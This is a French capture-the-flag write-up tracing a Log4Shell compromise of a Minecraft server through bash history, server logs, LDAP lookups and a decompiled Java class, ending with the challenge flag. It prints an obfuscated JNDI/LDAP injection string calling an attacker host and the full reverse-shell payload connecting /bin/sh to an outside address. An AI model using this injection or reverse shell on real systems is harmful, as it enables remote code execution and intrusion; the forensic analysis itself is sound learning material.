# Piratecraft

> Un service d'hébergement de serveurs de jeux fournit des VPS avec Minecraft préinstallé pour leurs clients. Certaines attaques ciblent les serveurs et les font tomber en panne. Vous êtes le nouvel administrateur système. Vous avez accès à un serveur attaqué. Détectez l'intrusion sur le serveur Minecraft et essayez de comprendre les actions malveillantes.
>
> > Information: utilisez les options suivantes avec la commande ssh pour éviter les déconnexions :
> >
> > ssh <address> -p <port> -o ServerAliveInterval=30 -o ServerAliveCountMax=2

## Description

En me connectant à la machine en tant que `user`, je vois une trace de l'attaque dans `.bash_history` :

```bash
whoami
mkdir /home/craft
cd /home/craft/
ls -lthar
apt-get update -y
apt-get install -y openjdk-17-jdk openjdk-17-jre git zip screen wget nano openssh-server php7.4
https://launcher.mojang.com/v1/objects/0a269b5f2c5b93b1712d0f5dc43b6182b9ab254e/server.jar
mv server.jar minecraft_server.jar
nano /home/craft/start.sh
chmod -R 775 /home/craft/
screen -ls
/home/craft/start.sh minecraft "java -Xmx1024M -Xms1024M -jar /home/craft/minecraft_server.jar nogui &"
screen -R minecraft
cat /var/log/minecraft.log
ls -lthar
pwd
whoami
netstat -lentupac
rm minecraft_server.jar
echo "Hacked by unhappy.competitor.com"
```

On voit que le fichier `minecraft_server.jar` a été supprimé, il faut probablement en retrouver la trace.

Je cherche des occurences de `unhappy.competitor.com` avec `find / unhappy.competitor.com`.
Je trouve l'URL également dans `minecraft.log` :

```
User Authenticator #10639/INFO]: UUID of player unhappy is a00b999e-001b-4807-b999-add902b9999c
[16:39:32] [Server thread/INFO]: unhappy[/172.240.18.1:57008] logged in with entity id 10991 at (-257.5, 67.0, -198.5)
[16:39:32] [Server thread/INFO]: unhappy joined the game
[16:39:33] [Server thread/INFO]: <unhappy> ${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}ap${sd:k5:-:}//unhappy.competitor.com:1389/a} 
[16:39:33] [Server thread/INFO]: <unhappy> Reference Class Name: foo 
[16:40:02] [Server thread/INFO]: unhappy lost connection: Disconnected
[16:40:02] [Server thread/INFO]: unhappy left the game
```

Je vois donc l'attaque effectuée par l'attaquant : c'est une chaîne d'attaque log4shell du type `jndi:ldap` où l'attaquant instruit le serveur de télécharger une classe Java et de l'exécuter.

![log4shell](https://www.incibe-cert.es/sites/default/files/blog/2022/Log4Shell/fig1.jpg)

Avec un peu de chance, le fichier à télécharger est encore présent. Je le recherche avec la commande `ldapsearch -x -H ldap://unhappy.competitor.com:1389/a`.

Malheureusement, pas de réponse car l'adresse IP n'est pas la bonne. Même problème avec `172.240.18.1` l'adresse du client.

En cherchant un peu plus dans les log grâce à `find /var/log unhappy`, je trouve l'adresse du serveur et je peux donc réitérer la commande : `ldapsearch -x -H ldap://174.10.54.15:1389/a`.

```
# extended LDIF
#
# LDAPv3
# base <> (default) with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

#
dn:
javaClassName: foo
javaCodeBase: http://174.10.54.15:50666/
objectClass: javaNamingReference
javaFactory: Exploit84686564564857543

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

On a donc une nouvelle URL où se trouve le code, récupérons le fichier : `wget http://174.10.54.15:50666/Exploit84686564564857543.class`.

Je peux alors décompiler la classe grâce à [un décompilateur Java](http://www.javadecompilers.com/).

```java
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.Base64.Decoder;

public class Exploit
{
  public Exploit() throws Exception
  {
    try
    {
      String str1 = "174.10.54.15";
      int i = 8080;
      String str2 = "/bin/sh";
      Process localProcess = new ProcessBuilder(new String[] { str2 }).redirectErrorStream(true).start();
      Socket localSocket = new Socket(str1, i);
      InputStream localInputStream1 = localProcess.getInputStream();InputStream localInputStream2 = localProcess.getErrorStream();InputStream localInputStream3 = localSocket.getInputStream();
      OutputStream localOutputStream1 = localProcess.getOutputStream();OutputStream localOutputStream2 = localSocket.getOutputStream();
      String str3 = "";String str4 = "";
      int[] arrayOfInt1 = { 73, 121, 77, 106, 73, 121, 77, 106, 73, 121, 77, 106, 73, 121, 77, 106, 73, 121, 77, 106, 73, 121, 77, 106, 73, 121, 77, 106, 73, 121, 77, 106, 73, 121, 77, 106, 73, 121, 77, 106, 73, 121, 77, 106, 73, 121, 77, 106, 73, 121, 77, 106, 73, 121, 77, 106, 73, 119, 61, 61 };
      int[] arrayOfInt2 = { 73, 121, 65, 116, 73, 67, 48, 103, 76, 83, 65, 116, 73, 67, 48, 103, 73, 70, 100, 70, 84, 69, 78, 80, 84, 85, 85, 103, 83, 85, 52, 103, 85, 48, 104, 70, 84, 69, 119, 103, 76, 83, 65, 116, 73, 67, 48, 103, 76, 83, 65, 116, 73, 67, 48, 103, 73, 119, 61, 61 };
      int[] arrayOfInt3 = { 73, 121, 65, 116, 73, 67, 48, 103, 81, 85, 120, 77, 73, 70, 108, 80, 86, 86, 73, 103, 81, 49, 86, 67, 82, 86, 77, 103, 81, 86, 74, 70, 73, 69, 74, 70, 84, 69, 57, 79, 82, 121, 66, 85, 84, 121, 66, 86, 85, 121, 65, 116, 73, 67, 48, 103, 73, 119, 61, 61 };
      int[] arrayOfInt4 = { 73, 121, 65, 116, 76, 83, 65, 107, 83, 71, 70, 106, 97, 50, 86, 107, 88, 50, 74, 53, 88, 51, 86, 117, 97, 71, 70, 119, 99, 72, 107, 117, 89, 50, 57, 116, 99, 71, 86, 48, 97, 88, 82, 118, 99, 105, 53, 106, 98, 50, 48, 103, 76, 83, 48, 103, 73, 119, 61, 61 };
      int[] arrayOfInt5 = { 73, 121, 66, 69, 82, 48, 104, 66, 81, 48, 116, 55, 78, 68, 69, 120, 88, 49, 107, 119, 86, 88, 74, 102, 81, 49, 85, 52, 77, 122, 86, 102, 78, 72, 73, 122, 88, 122, 103, 122, 77, 84, 66, 79, 78, 108, 56, 51, 77, 70, 57, 86, 78, 88, 48, 103, 73, 119, 61, 61 };
      int[] arrayOfInt6 = { 73, 121, 77, 106, 73, 121, 77, 106, 73, 121, 77, 106, 73, 121, 77, 106, 73, 121, 77, 106, 73, 121, 77, 106, 73, 121, 77, 106, 73, 121, 77, 106, 73, 121, 77, 106, 73, 121, 77, 106, 73, 121, 77, 106, 73, 121, 77, 106, 73, 121, 77, 106, 73, 121, 77, 106, 73, 119, 61, 61 };
      str4 = ""; int m; for (m : arrayOfInt1) str4 = str4 + (char)m; str3 = str3 + new String(java.util.Base64.getDecoder().decode(str4), StandardCharsets.UTF_8) + "\r\n";
      str4 = ""; for (m : arrayOfInt2) str4 = str4 + (char)m; str3 = str3 + new String(java.util.Base64.getDecoder().decode(str4), StandardCharsets.UTF_8) + "\r\n";
      str4 = ""; for (m : arrayOfInt3) str4 = str4 + (char)m; str3 = str3 + new String(java.util.Base64.getDecoder().decode(str4), StandardCharsets.UTF_8) + "\r\n";
      str4 = ""; for (m : arrayOfInt4) str4 = str4 + (char)m; str3 = str3 + new String(java.util.Base64.getDecoder().decode(str4), StandardCharsets.UTF_8) + "\r\n";
      str4 = ""; for (m : arrayOfInt5) str4 = str4 + (char)m; str3 = str3 + new String(java.util.Base64.getDecoder().decode(str4), StandardCharsets.UTF_8) + "\r\n";
      str4 = ""; for (m : arrayOfInt6) str4 = str4 + (char)m; str3 = str3 + new String(java.util.Base64.getDecoder().decode(str4), StandardCharsets.UTF_8) + "\r\n";
      localOutputStream2.write(str3.getBytes(StandardCharsets.UTF_8));
      while (!localSocket.isClosed()) {
        while (localInputStream1.available() > 0)
          localOutputStream2.write(localInputStream1.read());
        while (localInputStream2.available() > 0)
          localOutputStream2.write(localInputStream2.read());
        while (localInputStream3.available() > 0)
          localOutputStream1.write(localInputStream3.read());
        localOutputStream2.flush();
        localOutputStream1.flush();
        Thread.sleep(50L);
        try {
          localProcess.exitValue();
        }
        catch (Exception localException2) {}
      }
      

      localProcess.destroy();
      localSocket.close();
    }
    catch (Exception localException1) {
      System.out.println(localException1);
    }
  }
}
```

Je n'ai donc qu'à copier le code qui m'intéresse et afficher la sortie :

```java
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.Base64.Decoder;

public class Exploit
{
  public static void main(String[] args)
  {
    try
    {
      String str1 = "174.10.54.15";
      int i = 8080;
      String str2 = "/bin/sh";
      String str3 = "";String str4 = "";
      int[] arrayOfInt1 = { 73, 121, 77, 106, 73, 121, 77, 106, 73, 121, 77, 106, 73, 121, 77, 106, 73, 121, 77, 106, 73, 121, 77, 106, 73, 121, 77, 106, 73, 121, 77, 106, 73, 121, 77, 106, 73, 121, 77, 106, 73, 121, 77, 106, 73, 121, 77, 106, 73, 121, 77, 106, 73, 121, 77, 106, 73, 119, 61, 61 };
      int[] arrayOfInt2 = { 73, 121, 65, 116, 73, 67, 48, 103, 76, 83, 65, 116, 73, 67, 48, 103, 73, 70, 100, 70, 84, 69, 78, 80, 84, 85, 85, 103, 83, 85, 52, 103, 85, 48, 104, 70, 84, 69, 119, 103, 76, 83, 65, 116, 73, 67, 48, 103, 76, 83, 65, 116, 73, 67, 48, 103, 73, 119, 61, 61 };
      int[] arrayOfInt3 = { 73, 121, 65, 116, 73, 67, 48, 103, 81, 85, 120, 77, 73, 70, 108, 80, 86, 86, 73, 103, 81, 49, 86, 67, 82, 86, 77, 103, 81, 86, 74, 70, 73, 69, 74, 70, 84, 69, 57, 79, 82, 121, 66, 85, 84, 121, 66, 86, 85, 121, 65, 116, 73, 67, 48, 103, 73, 119, 61, 61 };
      int[] arrayOfInt4 = { 73, 121, 65, 116, 76, 83, 65, 107, 83, 71, 70, 106, 97, 50, 86, 107, 88, 50, 74, 53, 88, 51, 86, 117, 97, 71, 70, 119, 99, 72, 107, 117, 89, 50, 57, 116, 99, 71, 86, 48, 97, 88, 82, 118, 99, 105, 53, 106, 98, 50, 48, 103, 76, 83, 48, 103, 73, 119, 61, 61 };
      int[] arrayOfInt5 = { 73, 121, 66, 69, 82, 48, 104, 66, 81, 48, 116, 55, 78, 68, 69, 120, 88, 49, 107, 119, 86, 88, 74, 102, 81, 49, 85, 52, 77, 122, 86, 102, 78, 72, 73, 122, 88, 122, 103, 122, 77, 84, 66, 79, 78, 108, 56, 51, 77, 70, 57, 86, 78, 88, 48, 103, 73, 119, 61, 61 };
      int[] arrayOfInt6 = { 73, 121, 77, 106, 73, 121, 77, 106, 73, 121, 77, 106, 73, 121, 77, 106, 73, 121, 77, 106, 73, 121, 77, 106, 73, 121, 77, 106, 73, 121, 77, 106, 73, 121, 77, 106, 73, 121, 77, 106, 73, 121, 77, 106, 73, 121, 77, 106, 73, 121, 77, 106, 73, 121, 77, 106, 73, 119, 61, 61 };
      str4 = ""; for (int m : arrayOfInt1) str4 = str4 + (char)m; str3 = str3 + new String(java.util.Base64.getDecoder().decode(str4), StandardCharsets.UTF_8) + "\r\n";
      str4 = ""; for (int m : arrayOfInt2) str4 = str4 + (char)m; str3 = str3 + new String(java.util.Base64.getDecoder().decode(str4), StandardCharsets.UTF_8) + "\r\n";
      str4 = ""; for (int m : arrayOfInt3) str4 = str4 + (char)m; str3 = str3 + new String(java.util.Base64.getDecoder().decode(str4), StandardCharsets.UTF_8) + "\r\n";
      str4 = ""; for (int m : arrayOfInt4) str4 = str4 + (char)m; str3 = str3 + new String(java.util.Base64.getDecoder().decode(str4), StandardCharsets.UTF_8) + "\r\n";
      str4 = ""; for (int m : arrayOfInt5) str4 = str4 + (char)m; str3 = str3 + new String(java.util.Base64.getDecoder().decode(str4), StandardCharsets.UTF_8) + "\r\n";
      str4 = ""; for (int m : arrayOfInt6) str4 = str4 + (char)m; str3 = str3 + new String(java.util.Base64.getDecoder().decode(str4), StandardCharsets.UTF_8) + "\r\n";
      System.out.println(new String(str3.getBytes(StandardCharsets.UTF_8)));
    }
    catch (Exception localException1) {
      System.out.println(localException1);
    }
  }
}
```

Flag : `DGHACK{411_Y0Ur_CU835_4r3_8310N6_70_U5}`